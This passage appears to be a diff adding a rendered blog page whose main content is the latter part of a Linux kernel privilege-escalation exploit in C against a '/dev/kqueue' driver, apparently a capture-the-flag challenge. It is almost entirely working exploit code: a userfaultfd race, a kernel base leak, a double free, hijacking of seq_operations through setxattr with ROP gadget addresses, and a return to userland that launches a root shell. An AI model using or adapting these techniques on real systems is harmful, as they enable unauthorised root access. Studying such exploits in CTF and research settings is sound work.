+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r9,    user_rsp;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov r8,    user_ss;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;xor rax,   rax;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov rcx,   0xaaaaaaaa;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov rdx,   8;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov rsi,   rsp;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;mov rdi,   seq_fd;&#34;</span>
+</span></span><span style=display:flex><span>            <span style=color:#4070a0>&#34;syscall&#34;</span>
+</span></span><span style=display:flex><span>        );
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[+] back to userland successfully!&#34;</span>);
+</span></span><span style=display:flex><span>        printf(<span style=color:#4070a0>&#34;[+] uid: %d gid: %d</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, getuid(), getgid());
+</span></span><span style=display:flex><span>        puts(<span style=color:#4070a0>&#34;[*] execve root shell now...&#34;</span>);
+</span></span><span style=display:flex><span>        system(<span style=color:#4070a0>&#34;/bin/sh&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        uffdio_copy.src <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) page;
+</span></span><span style=display:flex><span>        uffdio_copy.dst <span style=color:#666>=</span> (<span style=color:#902000>unsigned</span> <span style=color:#902000>long</span>) msg.arg.pagefault.address <span style=color:#666>&amp;</span>
+</span></span><span style=display:flex><span>                                              <span style=color:#666>~</span>(page_size <span style=color:#666>-</span> <span style=color:#40a070>1</span>);
+</span></span><span style=display:flex><span>        uffdio_copy.len <span style=color:#666>=</span> page_size;
+</span></span><span style=display:flex><span>        uffdio_copy.mode <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>        uffdio_copy.copy <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> (ioctl(uffd, UFFDIO_COPY, <span style=color:#666>&amp;</span>uffdio_copy) <span style=color:#666>==</span> <span style=color:#666>-</span><span style=color:#40a070>1</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;ioctl-UFFDIO_COPY&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>main</span>(<span style=color:#902000>int</span> argc, <span style=color:#902000>char</span> <span style=color:#007020;font-weight:700>const</span><span style=color:#666>*</span> argv[])
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>	size_t      data[<span style=color:#40a070>0x10</span>];
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span>        <span style=color:#666>*</span>uffd_buf_leak;
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span>        <span style=color:#666>*</span>uffd_buf_uaf;
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span>        <span style=color:#666>*</span>uffd_buf_hack;
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span>         pipe_fd[<span style=color:#40a070>2</span>];
+</span></span><span style=display:flex><span>    <span style=color:#902000>int</span>         shm_id;
+</span></span><span style=display:flex><span>    <span style=color:#902000>char</span>        <span style=color:#666>*</span>shm_addr;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>	signal(SIGSEGV, get_root_shell);
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// 绑定到一个cpu上
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>	<span style=color:#902000>unsigned</span> <span style=color:#902000>char</span> cpu_mask <span style=color:#666>=</span> <span style=color:#40a070>0x01</span>;
+</span></span><span style=display:flex><span>    sched_setaffinity(<span style=color:#40a070>0</span>, <span style=color:#40a070>1</span>, <span style=color:#666>&amp;</span>cpu_mask);
+</span></span><span style=display:flex><span>	get_userstat();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	dev_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/dev/kqueue&#34;</span>, O_RDONLY);
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>if</span> (dev_fd <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>		errExit(<span style=color:#4070a0>&#34;open dev&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	page <span style=color:#666>=</span> malloc(<span style=color:#40a070>0x1000</span>);
+</span></span><span style=display:flex><span>    page_size <span style=color:#666>=</span> sysconf(_SC_PAGE_SIZE);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> <span style=color:#40a070>100</span>; i<span style=color:#666>++</span>)
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span> ((seq_fd_reserve[i] <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/proc/self/stat&#34;</span>, O_RDONLY)) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>            errExit(<span style=color:#4070a0>&#34;seq reserve!&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	uffd_buf_leak <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, page_size, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    registerUserFaultFd(uffd_buf_leak, page_size, leak_thread);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	shm_id <span style=color:#666>=</span> shmget(<span style=color:#40a070>114514</span>, <span style=color:#40a070>0x1000</span>, SHM_R <span style=color:#666>|</span> SHM_W <span style=color:#666>|</span> IPC_CREAT);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (shm_id <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;shmget!&#34;</span>);
+</span></span><span style=display:flex><span>    shm_addr <span style=color:#666>=</span> shmat(shm_id, <span style=color:#007020>NULL</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (shm_addr <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;shmat!&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span>(shmdt(shm_addr) <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>)
+</span></span><span style=display:flex><span>        errExit(<span style=color:#4070a0>&#34;shmdt!&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// leak kernel base  
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    push(uffd_buf_leak);
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] kernel offset: %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, kernel_offset);
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[+] kernel base: %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, kernel_base);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#60a0b0;font-style:italic>// create uffd thread for double free
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    uffd_buf_uaf <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, page_size, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    registerUserFaultFd(uffd_buf_uaf, page_size, double_free_thread);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// construct the double free
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    push(<span style=color:#4070a0>&#34;arttnba3&#34;</span>);
+</span></span><span style=display:flex><span>    pop(uffd_buf_uaf);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	 <span style=color:#60a0b0;font-style:italic>// create uffd thread for hijack
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    uffd_buf_hack <span style=color:#666>=</span> (<span style=color:#902000>char</span><span style=color:#666>*</span>) mmap(<span style=color:#007020>NULL</span>, page_size <span style=color:#666>*</span> <span style=color:#40a070>2</span>, PROT_READ <span style=color:#666>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#666>|</span> MAP_ANONYMOUS, <span style=color:#666>-</span><span style=color:#40a070>1</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>    registerUserFaultFd(uffd_buf_hack <span style=color:#666>+</span> page_size, page_size, hijack_thread);
+</span></span><span style=display:flex><span>    printf(<span style=color:#4070a0>&#34;[*] gadget: %p</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, <span style=color:#40a070>0xffffffff81a6f327</span> <span style=color:#666>+</span> kernel_offset);
+</span></span><span style=display:flex><span>    <span style=color:#666>*</span>(size_t <span style=color:#666>*</span>)(uffd_buf_hack <span style=color:#666>+</span> page_size <span style=color:#666>-</span> <span style=color:#40a070>8</span>) <span style=color:#666>=</span> <span style=color:#40a070>0xffffffff810494c5</span> <span style=color:#666>+</span> kernel_offset;    <span style=color:#60a0b0;font-style:italic>// add    rsp,0x160, pop 4, ret
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
+</span></span><span style=display:flex><span>    <span style=color:#60a0b0;font-style:italic>// // userfaultfd + setxattr to hijack the seq_ops-&gt;stat, trigger in uffd thread
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    seq_fd <span style=color:#666>=</span> open(<span style=color:#4070a0>&#34;/proc/self/stat&#34;</span>, O_RDONLY);
+</span></span><span style=display:flex><span>    setxattr(<span style=color:#4070a0>&#34;/exp&#34;</span>, <span style=color:#4070a0>&#34;arttnba3&#34;</span>, uffd_buf_hack <span style=color:#666>+</span> page_size <span style=color:#666>-</span> <span style=color:#40a070>8</span>, <span style=color:#40a070>32</span>, <span style=color:#40a070>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#007020;font-weight:700>return</span> <span style=color:#40a070>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#902000>void</span> <span style=color:#06287e>get_userstat</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    __asm__(<span style=color:#4070a0>&#34;.intel_syntax noprefix</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
+</span></span><span style=display:flex><span>    __asm__ <span style=color:#007020;font-weight:700>volatile</span>(
+</span></span><span style=display:flex><span>        <span style=color:#4070a0>&#34;mov user_cs, cs;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>         mov user_ss, ss;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>         mov user_gs, gs;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>         mov user_ds, ds;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>         mov user_es, es;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>         mov user_rsp, rsp;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>         pushf;\
+</span></span></span><span style=display:flex><span><span style=color:#4070a0>         pop user_rflags&#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>//    printf(&#34;[+] got user stat\n&#34;);
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>}
+</span></span></code></pre></div></section><div class=post-tags></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
+<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
